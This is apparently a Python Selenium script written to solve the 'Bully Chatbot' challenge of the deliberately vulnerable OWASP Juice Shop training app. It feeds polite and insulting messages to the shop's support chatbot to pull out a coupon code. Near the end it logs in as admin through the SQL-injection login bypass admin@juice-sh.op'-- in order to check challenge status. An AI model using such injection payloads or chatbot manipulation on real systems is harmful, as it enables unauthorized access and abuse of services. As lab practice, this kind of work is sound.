#!/usr/bin/env python3
"""
Bully Chatbot Challenge Solver using Selenium
Gets a coupon code from the chatbot
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot_selenium():
    """Solve Bully Chatbot challenge with Selenium"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Selenium Automation")
    print("=" * 60)
    print("📝 Objective: Receive a coupon code from the support chatbot")
    print("=" * 60)
    
    # Setup Chrome options
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in headless mode
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    # Create WebDriver
    print("\n🌐 Starting Chrome browser...")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.implicitly_wait(10)
    
    try:
        # Navigate to Juice Shop
        print("📍 Navigating to Juice Shop...")
        driver.get(TARGET)
        time.sleep(3)
        
        # Dismiss any welcome dialogs
        try:
            dismiss_button = driver.find_element(By.XPATH, "//button[contains(@class, 'mat-button') and contains(., 'Dismiss')]")
            dismiss_button.click()
            print("   Dismissed welcome dialog")
        except:
            pass
        
        # Look for and click the support chat button
        print("\n🔍 Looking for support chat button...")
        
        chat_button_selectors = [
            "//mat-icon[contains(text(), 'chat')]/..",
            "//mat-icon[contains(text(), 'contact_support')]/..",
            "//button[contains(@aria-label, 'support')]",
            "//button[contains(@aria-label, 'chat')]",
            "//button[contains(@mattooltip, 'support')]",
            "//button[contains(@class, 'chat')]",
            "//button/mat-icon[contains(text(), 'chat')]/..",
            "//mat-icon[text()='chat_bubble']/..",
        ]
        
        chat_opened = False
        for selector in chat_button_selectors:
            try:
                chat_button = driver.find_element(By.XPATH, selector)
                if chat_button.is_displayed():
                    print(f"   Found chat button: {selector}")
                    driver.execute_script("arguments[0].click();", chat_button)
                    chat_opened = True
                    time.sleep(2)
                    break
            except:
                continue
        
        if not chat_opened:
            print("   ⚠️ Could not find chat button, trying direct navigation...")
            driver.get(f"{TARGET}/#/chatbot")
            time.sleep(2)
        
        # Find the chat input field
        print("\n💬 Looking for chat input field...")
        
        input_selectors = [
            "//input[@placeholder]",
            "//input[contains(@placeholder, 'message')]",
            "//input[contains(@placeholder, 'ask')]",
            "//input[contains(@placeholder, 'type')]",
            "//textarea",
            "//input[@id='message-input']",
            "//input[contains(@class, 'chat')]",
            "//mat-form-field//input",
        ]
        
        chat_input = None
        for selector in input_selectors:
            try:
                inputs = driver.find_elements(By.XPATH, selector)
                if inputs:
                    # Use the last visible input (likely the chat)
                    for inp in reversed(inputs):
                        if inp.is_displayed():
                            chat_input = inp
                            print(f"   Found chat input: {selector}")
                            break
                    if chat_input:
                        break
            except:
                continue
        
        if chat_input:
            print("\n🎯 Sending messages to get coupon...")
            
            # Strategy 1: Ask nicely for coupon
            nice_messages = [
                "hello",
                "coupon",
                "can I have a coupon please",
                "discount code",
                "I want a coupon",
            ]
            
            for i, msg in enumerate(nice_messages, 1):
                try:
                    print(f"   {i}. Sending: '{msg}'")
                    chat_input.clear()
                    chat_input.send_keys(msg)
                    chat_input.send_keys(Keys.RETURN)
                    time.sleep(2)
                    
                    # Check for coupon in response
                    try:
                        messages = driver.find_elements(By.XPATH, "//div[contains(@class, 'message') or contains(@class, 'chat')]")
                        for message in messages:
                            text = message.text
                            if any(word in text.lower() for word in ['coupon', 'code', 'discount']):
                                print(f"      Bot response: {text[:100]}")
                                # Look for coupon codes (usually uppercase alphanumeric)
                                import re
                                codes = re.findall(r'\b[A-Z0-9]{5,20}\b', text)
                                if codes:
                                    print(f"      🎯 Possible coupon found: {codes[0]}")
                    except:
                        pass
                        
                except Exception as e:
                    print(f"      Error: {e}")
            
            # Strategy 2: Be mean to trigger different response
            print("\n😈 Trying mean messages...")
            mean_messages = [
                "stupid",
                "you are stupid",
                "stupid bot",
                "useless",
                "you suck"
            ]
            
            for i, msg in enumerate(mean_messages, 1):
                try:
                    print(f"   {i}. Sending: '{msg}'")
                    chat_input.clear()
                    chat_input.send_keys(msg)
                    chat_input.send_keys(Keys.RETURN)
                    time.sleep(2)
                    
                    # Check response
                    try:
                        page_text = driver.page_source
                        if 'coupon' in page_text.lower():
                            print("      🎯 Coupon mentioned in response!")
                    except:
                        pass
                        
                except Exception as e:
                    print(f"      Error: {e}")
            
            print("\n✅ Finished interacting with chatbot")
            
        else:
            print("   ❌ Could not find chat input field")
        
        # Take screenshot for debugging
        driver.save_screenshot("/Users/walterbarr_1/sql-injection-lab/bully_chatbot_selenium.png")
        print("📸 Screenshot saved")
        
        # Wait a moment for any async operations
        time.sleep(3)
        
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        driver.quit()
        print("\n🌐 Browser closed")
    
    # Check if challenge is solved
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(f"{TARGET}/rest/user/login",
                              json={"email": "admin@juice-sh.op'--", "password": "x"})
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Check challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully_challenge = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
        
        if bully_challenge:
            if bully_challenge.get('solved', False):
                print(f"\n✅ SUCCESS! {bully_challenge['name']} is SOLVED!")
                print(f"   Category: {bully_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bully_challenge.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {bully_challenge['name']} not yet solved")
                print("\n💡 Tips:")
                print("   - The bot may need specific trigger words")
                print("   - Try asking for 'coupon', 'discount', 'promo code'")
                print("   - Being mean might trigger a special response")
    
    print("\n" + "=" * 60)
    print("📊 Check the scoreboard: http://66.42.93.220:3000/#/score-board")
    
    return False

if __name__ == "__main__":
    result = solve_bully_chatbot_selenium()
    if result:
        print("\n🎉 Challenge successfully solved with Selenium!")
    else:
        print("\n📝 Challenge requires manual verification")
